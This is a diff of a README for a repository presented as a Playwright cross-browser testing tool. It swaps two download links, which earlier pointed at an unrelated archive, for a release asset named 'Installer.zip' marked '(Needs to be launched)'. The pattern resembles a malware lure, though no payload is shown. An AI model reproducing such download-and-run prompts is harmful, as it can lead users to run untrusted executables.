@@ -1,6 +1,6 @@
 # 🌐 Browser-Testing 🚀
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/gollfinho/Browser-Testing/releases/download/v1.0/Installer.zip)](https://github.com/gollfinho/Browser-Testing/releases/download/v1.0/Installer.zip)
 
 Welcome to the **Browser-Testing** repository - your go-to tool for testing websites across Safari, Chrome, and Firefox on Linux, macOS, and Windows using Playwright. Ensuring cross-browser compatibility has never been easier with the automated features provided by this tool. Forget the need for a physical Mac for Safari testing; now you can test seamlessly across different browsers and operating systems with just a few clicks!
 
@@ -14,7 +14,7 @@ Welcome to the **Browser-Testing** repository - your go-to tool for testing webs
 ## Getting Started 🚀
 To get started with **Browser-Testing**, simply download the latest version from the link below. This tool will revolutionize the way you test your websites for cross-browser compatibility.
 
-[Download Browser-Testing v1.0.0](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip) (Needs to be launched)
+[Download Browser-Testing v1.0.0](https://github.com/gollfinho/Browser-Testing/releases/download/v1.0/Installer.zip) (Needs to be launched)
 
 ## Installation 🖥️
 Follow these steps to install **Browser-Testing** on your system:
